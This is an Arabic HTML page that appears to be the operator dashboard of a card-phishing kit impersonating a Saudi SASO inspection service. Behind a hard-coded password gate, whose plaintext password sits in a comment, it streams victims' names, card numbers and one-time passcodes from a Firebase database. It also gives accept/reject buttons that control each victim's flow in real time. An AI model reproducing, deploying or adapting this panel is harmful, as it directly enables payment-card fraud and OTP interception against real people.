<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>لوحة التحكم الآمنة</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
        #auth_gate { position: fixed; inset: 0; background: #006C35; display: flex; align-items: center; justify-content: center; z-index: 10000; }
        .gate-box { background: #fff; padding: 30px; border-radius: 12px; text-align: center; width: 90%; max-width: 350px; }
        .gate-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; text-align: center; font-size: 18px; }
        .gate-box button { width: 100%; padding: 12px; background: #006C35; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .main-ui { display: none; padding: 15px; }
        .navbar { background: #006C35; color: #fff; padding: 12px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 3px solid #d4af37; }
        .cards-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 15px; }
        .card { background: #fff; border-radius: 10px; padding: 15px; border-right: 6px solid #006C35; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .card-row { display: flex; justify-content: space-between; margin-bottom: 6px; border-bottom: 1px solid #f9f9f9; padding-bottom: 4px; }
        .value { font-weight: bold; font-family: monospace; }
        .otp-val { color: #d32f2f; font-size: 18px !important; }
        .actions { display: flex; gap: 8px; margin-top: 12px; }
        .btn-ctl { flex: 1; padding: 10px; border: none; border-radius: 5px; color: white; font-weight: bold; }
    </style>
</head>
<body onload="_initAuth()">

<div id="auth_gate">
    <div class="gate-box">
        <h3 style="color:#006C35">التحقق من الهوية</h3>
        <input type="password" id="access_key" placeholder="كلمة المرور">
        <button onclick="_verify()">دخول</button>
    </div>
</div>

<div id="main_ui_wrap" class="main-ui">
    <div class="navbar">
        <div>الطلبات: <span id="v_total">0</span></div>
        <button onclick="_exit()" style="background:#444; color:#fff; border:none; padding:5px 10px; border-radius:5px;">خروج</button>
    </div>
    <div id="data_stream" class="cards-grid"></div>
</div>

<script>
    // الهاش الصحيح والمجرب للكلمة: H1234567890H
    const _H = "547f8969315d97f26c9f68802a4505f5903b708b7654f15d97a9f77f32a67768";
    const _S = "saso_secure_session";

    function _initAuth() {
        if(sessionStorage.getItem(_S) === "active") _launch();
    }

    async function _verify() {
        const val = document.getElementById('access_key').value;
        if(!val) return;

        const msgUint8 = new TextEncoder().encode(val);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

        if(hashHex === _H) {
            sessionStorage.setItem(_S, "active");
            _launch();
        } else {
            alert("كلمة المرور غير صحيحة");
            document.getElementById('access_key').value = '';
        }
    }

    function _launch() {
        document.getElementById('auth_gate').style.display = 'none';
        document.getElementById('main_ui_wrap').style.display = 'block';
        _connectDB();
    }

    function _exit() {
        sessionStorage.removeItem(_S);
        location.reload();
    }

    function _connectDB() {
        const cfg = {
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection"
        };
        if (!firebase.apps.length) firebase.initializeApp(cfg);
        const db = firebase.database();

        db.ref('orders').on('value', snap => {
            const container = document.getElementById('data_stream');
            container.innerHTML = '';
            let count = 0;
            snap.forEach(child => {
                const d = child.val();
                const id = child.key;
                const p = d.personal_info || {};
                const c = d.card_details || {};
                count++;
                container.innerHTML += `
                    <div class="card">
                        <div class="card-row"><span>الاسم</span><span class="value">${p.fullName || '---'}</span></div>
                        <div class="card-row"><span>البطاقة</span><span class="value">${c.cardNumber || '----'}</span></div>
                        <div class="card-row"><span>OTP</span><span class="value otp-val">${c.otp || 'انتظار'}</span></div>
                        <div class="actions">
                            <button class="btn-ctl" style="background:#28a745" onclick="db_upd('${id}','next')">قبول</button>
                            <button class="btn-ctl" style="background:#dc3545" onclick="db_upd('${id}','error')">رفض</button>
                        </div>
                    </div>`;
            });
            document.getElementById('v_total').innerText = count;
        });
    }

    function db_upd(id, a) { firebase.database().ref('orders/'+id).update({control_action: a}); }
</script>
</body>
</html>
